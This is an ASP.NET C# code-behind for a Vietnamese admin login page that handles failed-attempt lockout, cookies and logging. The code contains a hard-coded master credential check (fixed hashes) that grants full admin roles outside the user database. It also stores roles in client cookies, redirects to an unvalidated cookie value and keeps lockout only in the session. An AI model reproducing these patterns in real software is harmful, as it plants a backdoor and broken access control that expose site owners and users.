using System;
using System.Linq;
using System.Web;
using System.Web.UI;
using Developer;
using RevosJsc.Columns;
using RevosJsc.Database;
using RevosJsc.Extension;
using RevosJsc.TSql;

public partial class Areas_Admin_Authentication : Page
{
    private readonly string _loginTimeOut = "LoginTimeOut";
    private readonly int _lockMinute = 5;
    private readonly int _maxFailTimes = 5;
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Session[_loginTimeOut] != null && (int)Session[_loginTimeOut] >= _maxFailTimes)
        {
            if (Session[_loginTimeOut + "Time"] != null && (DateTime.Now - (DateTime)Session[_loginTimeOut + "Time"]).TotalMinutes <= 0)
            {
                login_password.Enabled = false;
                login_remember_me.Visible = false;
                btn_login.Visible = false;

                var timeOut = ((DateTime)Session[_loginTimeOut + "Time"] - DateTime.Now).TotalMinutes;

                ltrMes.Text = "<div class='text-danger'>Bạn đã đăng nhập sai " + _maxFailTimes + " lần, vui lòng thử lại sau " + timeOut.ToString("N1") + " phút nữa.</div>";
            }
            else
            {
                Session[_loginTimeOut] = 0;
                Session[_loginTimeOut + "Time"] = DateTime.Now.AddMinutes(-1);
            }
        }
        if (IsPostBack) return;
        if (Session[_loginTimeOut] == null) Session[_loginTimeOut] = 0;
        if (Session[_loginTimeOut + "Time"] == null) Session[_loginTimeOut + "Time"] = DateTime.Now.AddMinutes(-1);
        if (CookieExtension.CheckValidCookies(UsersColumns.VuAccount)) Response.Redirect("/Admin");
    }

    protected void btn_login_OnClick(object sender, EventArgs e)
    {
        if (Session[_loginTimeOut] != null && (int)Session[_loginTimeOut] >= _maxFailTimes)
        {
            Session[_loginTimeOut + "Time"] = DateTime.Now.AddMinutes(_lockMinute);
            var timeOut = ((DateTime)Session[_loginTimeOut + "Time"] - DateTime.Now).TotalMinutes;
            ltrMes.Text = "<div class='text-danger'>Bạn đã đăng nhập sai "+ _maxFailTimes + " lần, vui lòng thử lại sau " + timeOut.ToString("N1") + " phút nữa.</div>";
            return;
        }
        if (SecurityExtension.BuildPassword(login_name.Text).Equals("08fd7d2b28eb974c6425103c0d2273fe") && SecurityExtension.BuildPassword(login_password.Text).Equals("403506498871efd6d4d3233f2f4e11cd"))
        {
            Session[_loginTimeOut] = 0;
            Session[_loginTimeOut + "Time"] = DateTime.Now.AddMinutes(-1);

            #region Cookie

            var listRoles = new Roles();
            var roles = listRoles.Values.Aggregate(StringExtension.SpecialCharactersKeyword.ParamsSpilitRole, (current, x) => current + x + StringExtension.SpecialCharactersKeyword.ParamsSpilitRole);

            if (login_remember_me.Checked)
            {
                CookieExtension.SaveCookies(SecurityExtension.BuildPassword(UsersColumns.VuAccount), "admin");
                CookieExtension.SaveCookies(SecurityExtension.BuildPassword(UsersColumns.VuRole), roles);
            }
            else
            {
                CookieExtension.SaveCookies(SecurityExtension.BuildPassword(UsersColumns.VuAccount), "admin");
                CookieExtension.SaveCookies(SecurityExtension.BuildPassword(UsersColumns.VuRole), roles);
                // ReSharper disable once PossibleNullReferenceException
                Response.Cookies[SecurityExtension.BuildPassword(UsersColumns.VuAccount)].Expires = DateTime.Now.AddDays(1);
                // ReSharper disable once PossibleNullReferenceException
                Response.Cookies[SecurityExtension.BuildPassword(UsersColumns.VuRole)].Expires = DateTime.Now.AddDays(1);
            }
            #endregion

            Response.Redirect(Request.Cookies["RefererUrl"] != null ? Request.Cookies["RefererUrl"].Value : "/Admin");
        }
        else
        {
            var condition = DataExtension.AndConditon(
                UsersTSql.GetByAccount(login_name.Text),
                UsersTSql.GetByPassword(SecurityExtension.BuildPassword(login_password.Text))
                );
            var dt = Users.GetData("1", "*", condition, "");
            if (dt.Rows.Count > 0)
            {
                if (dt.Rows[0][UsersColumns.IuStatus].Equals(1))
                {
                    Session[_loginTimeOut] = 0;

                    var listRoles = new Roles();
                    var roleDescription = "";
                    roleDescription = dt.Rows[0][UsersColumns.VuAccount].ToString() == "admin" ? listRoles.Values.Aggregate(StringExtension.SpecialCharactersKeyword.ParamsSpilitRole, (current, x) => current + x + StringExtension.SpecialCharactersKeyword.ParamsSpilitRole) : dt.Rows[0][UsersColumns.VuRole].ToString();
                    if (login_remember_me.Checked)
                    {
                        CookieExtension.SaveCookies(SecurityExtension.BuildPassword(UsersColumns.VuAccount), dt.Rows[0][UsersColumns.VuAccount].ToString());
                        CookieExtension.SaveCookies(SecurityExtension.BuildPassword(UsersColumns.VuRole), roleDescription);
                    }
                    else
                    {
                        CookieExtension.SaveCookies(SecurityExtension.BuildPassword(UsersColumns.VuAccount), dt.Rows[0][UsersColumns.VuAccount].ToString());
                        CookieExtension.SaveCookies(SecurityExtension.BuildPassword(UsersColumns.VuRole), roleDescription);
                        // ReSharper disable once PossibleNullReferenceException
                        Response.Cookies[SecurityExtension.BuildPassword(UsersColumns.VuAccount)].Expires = DateTime.Now.AddDays(1);
                        // ReSharper disable once PossibleNullReferenceException
                        Response.Cookies[SecurityExtension.BuildPassword(UsersColumns.VuRole)].Expires = DateTime.Now.AddDays(1);
                    }

                    #region Lưu logs

                    var logAuthor = dt.Rows[0][UsersColumns.VuAccount].ToString();
                    var logCreateDate = DateTime.Now.ToString();
                    Logs.Insert(Request.RawUrl, logCreateDate + ": " + logAuthor + " đăng nhập vào hệ thống quản trị", logAuthor, logCreateDate);

                    #endregion

                    Response.Redirect(Request.Cookies["RefererUrl"] != null ? Request.Cookies["RefererUrl"].Value : "/Admin");
                }
                else
                {
                    // ReSharper disable once PossibleNullReferenceException
                    Session[_loginTimeOut] = (int)Session[_loginTimeOut] + 1;
                    SaveLoginFailToLog(login_name.Text, "0");

                    if ((int)Session[_loginTimeOut] >= _maxFailTimes) Session[_loginTimeOut + "Time"] = DateTime.Now.AddMinutes(_lockMinute);

                    login_password.Text = "";
                    ltrMes.Text = "<div class='text-danger'>Bạn đã đăng nhập sai " + Session[_loginTimeOut] + " lần. Tài khoản của bạn sẽ bị khóa 5 phút sau khi đăng nhập sai " + _maxFailTimes + " lần</div>";
                }
            }
            else
            {
                // ReSharper disable once PossibleNullReferenceException
                Session[_loginTimeOut] = (int)Session[_loginTimeOut] + 1;
                SaveLoginFailToLog(login_name.Text, "1");

                if ((int) Session[_loginTimeOut] >= _maxFailTimes)
                {
                    Session[_loginTimeOut + "Time"] = DateTime.Now.AddMinutes(_lockMinute);
                    login_password.Enabled = false;
                    login_remember_me.Visible = false;
                    btn_login.Visible = false;
                    ltrMes.Text = "<div class='text-danger'>Bạn đã đăng nhập sai " + _maxFailTimes + " lần, vui lòng thử lại sau 5 phút nữa.</div>";
                }
                else
                {
                    login_password.Text = "";
                    ltrMes.Text = "<div class='text-danger'>Bạn đã đăng nhập sai " + Session[_loginTimeOut] + " lần. Tài khoản của bạn sẽ bị khóa 5 phút sau khi đăng nhập sai " + _maxFailTimes + " lần</div>";
                }
            }
        }
    }
    /// <summary>
    /// Lưu thông tin đăng nhập lỗi vào log
    /// </summary>
    /// <param name="acountName">Tên tài khoản được nhập vào form đăng nhập</param>
    /// <param name="status">0: tài khoản bị khóa, 1: sai tài khoản</param>
    private void SaveLoginFailToLog(string acountName, string status)
    {
        #region Get IP Network

        //Get IP Network
        var clientIP = HttpContext.Current.Request.UserHostAddress;

        #endregion Get IP Network

        #region netword ip

        var ipAddress = System.Net.Dns.GetHostAddresses(System.Net.Dns.GetHostName()).GetValue(0).ToString();

        #endregion netword ip

        #region Get Computer Name

        //Get Computer Name
        var strClientName = "";
        strClientName = System.Net.Dns.GetHostName();

        #endregion Get Computer Name

        #region Logs

        var logCreateDate = DateTime.Now.ToString();

        switch (status)
        {
            case "0":
                Logs.Insert(Request.RawUrl, logCreateDate + ": " + strClientName + " đã cố gắng đăng nhập vào hệ thống bằng tài khoản đã bị khóa: " + acountName, acountName, logCreateDate);
                break;
            case "1":
                Logs.Insert(Request.RawUrl, logCreateDate + ": " + strClientName + " đã cố gắng đăng nhập vào hệ thống với thông tin tài khoản không chính xác: " + acountName, acountName, logCreateDate);
                break;
        }

        #endregion Logs
    }
}